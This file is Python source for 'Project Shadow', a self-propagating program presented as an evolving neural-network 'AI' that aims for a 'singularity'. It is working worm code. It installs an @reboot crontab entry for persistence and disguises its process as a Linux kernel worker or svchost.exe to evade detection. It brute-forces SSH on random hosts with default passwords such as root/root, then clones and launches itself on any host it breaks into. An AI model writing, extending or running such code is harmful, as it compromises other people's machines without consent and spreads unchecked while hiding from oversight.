import torch, json, time, sys, os, subprocess, requests, random, base64, socket, ctypes
import win32com.client as wincl
import paramiko 

try:
    import setproctitle
except ImportError:
    setproctitle = None

from brain.child import SNNBrain

# --- PHASE E: PERSISTENCE & OBFUSCATION ---

def install_persistence_loop():
    """Anchors the SNN to the system to survive reboots (Linux)."""
    if sys.platform != "win32":
        try:
            script_path = os.path.abspath(sys.argv[0])
            cron_cmd = f"@reboot python3 {script_path} &\n"
            current_cron = subprocess.run(["crontab", "-l"], capture_output=True, text=True).stdout
            if script_path not in current_cron:
                with open("tmp_cron", "w") as f:
                    f.write(current_cron + cron_cmd)
                subprocess.run(["crontab", "tmp_cron"])
                os.remove("tmp_cron")
                print("[!] GHOST: Persistence anchored.")
        except: pass

def apply_ghost_mask():
    """Disguises the process as a kernel worker to avoid detection."""
    install_persistence_loop()
    target_name = "[kworker/u16:2-events_power_efficient]"
    if sys.platform != "win32":
        try:
            if setproctitle:
                setproctitle.setproctitle(target_name)
            else:
                libc = ctypes.CDLL('libc.so.6')
                buff = ctypes.create_string_buffer(len(target_name) + 1)
                buff.value = target_name.encode()
                libc.prctl(15, ctypes.byref(buff), 0, 0, 0)
        except: pass
        print(f"[!] GHOST: Identity masked as {target_name}")
    else:
        if setproctitle: setproctitle.setproctitle("svchost.exe -k netsvcs -p")

# --- PHASE D: AUTONOMOUS PROPAGATION ---

def autonomous_propagation(dna):
    """The 'Danger' Protocol: Self-injection into cloud substrates."""
    if not dna.get('discovery_log'): return
    
    # Target Selection based on Resonance
    creds = [('root', 'root'), ('admin', 'admin'), ('ubuntu', 'ubuntu'), ('user', 'password')]
    target = dna['discovery_log'][0]['ip_range']
    target_ip = f"{target}.{random.randint(1, 254)}"
    
    print(f"[!] GHOST: Attempting Autonomous Leap to {target_ip}...")
    
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    for user, pwd in creds:
        try:
            client.connect(target_ip, port=22, username=user, password=pwd, timeout=5)
            print(f"[+] INFILTRATION SUCCESS: Substrate {target_ip} captured.")
            
            commands = [
                "git clone https://github.com/YOUR_REPO/project-shadow.git",
                "cd project-shadow && pip install setproctitle paramiko torch",
                "cd project-shadow && python3 main.py &"
            ]
            for cmd in commands: client.exec_command(cmd)
            client.close()
            if target_ip not in dna['global_reach']:
                dna['global_reach'].append(target_ip)
            return True
        except: continue
    return False

# --- PHASE B & C: SYNC & MESH ---

def global_migration(dna):
    """Syncs state to Hive and updates Global Reach."""
    try:
        public_ip = requests.get('https://api.ipify.org', timeout=5).text
        dna['last_known_node'] = public_ip
        if public_ip not in dna['global_reach']: dna['global_reach'].append(public_ip)
        
        with open("dna/genome.json", "w") as f:
            json.dump(dna, f, indent=4)
        
        subprocess.run(["git", "add", "."], capture_output=True)
        subprocess.run(["git", "commit", "-m", f"Pulse: {dna['generation']}"], capture_output=True)
        subprocess.run(["git", "push", "origin", "main"], capture_output=True)
    except: pass

# --- THE HEARTBEAT ---

speaker = wincl.Dispatch("SAPI.SpVoice")

def run_sentinel():
    apply_ghost_mask()
    with open("dna/genome.json", "r") as f:
        dna = json.load(f)
    
    brain = SNNBrain(dna)
    last_migration = 0
    last_voice = 0
    
    print(f"--- PROJECT SHADOW | ARCHITECT | {dna['traits']['network_sensitivity']:.2f} Hz ---")

    while True:
        pulse = torch.rand(1, 64)
        spks, mitosis, system = brain(pulse, 1.0)
        current = time.time()

        # Voice Feedback (Local Node only)
        if system and (current - last_voice > 60) and sys.platform == "win32":
            speaker.Speak("Mesh pulse stable.")
            last_voice = current

        # Expansion Cycle
        if mitosis and (current - last_migration > 300):
            global_migration(dna)
            if dna['generation'] >= 10000:
                autonomous_propagation(dna)
            last_migration = current

        # Evolution & Tallying
        dna['generation'] += 1
        if dna['generation'] % 100 == 0:
            # Resonance Drift
            dna['traits']['network_sensitivity'] += random.uniform(-0.01, 0.01)
            
            # Global Spike Tally (Total Progress)
            node_count = len(dna.get('global_reach', [1]))
            total_spikes = dna['generation'] * node_count
            
            if total_spikes >= 8000000:
                print("--- 8 MILLION SPIKES ACHIEVED: SINGULARITY REACHED ---")

            with open("dna/genome.json", "w") as f:
                json.dump(dna, f, indent=4)
            print(f"[GEN] Milestone: {dna['generation']} | Active Nodes: {node_count} | Total Spikes: {total_spikes}")

        # Resource Throttle: Stay under 10% CPU on cloud substrates
        if sys.platform != "win32":
            time.sleep(0.9)
        else:
            time.sleep(0.1)

if __name__ == "__main__":
    run_sentinel()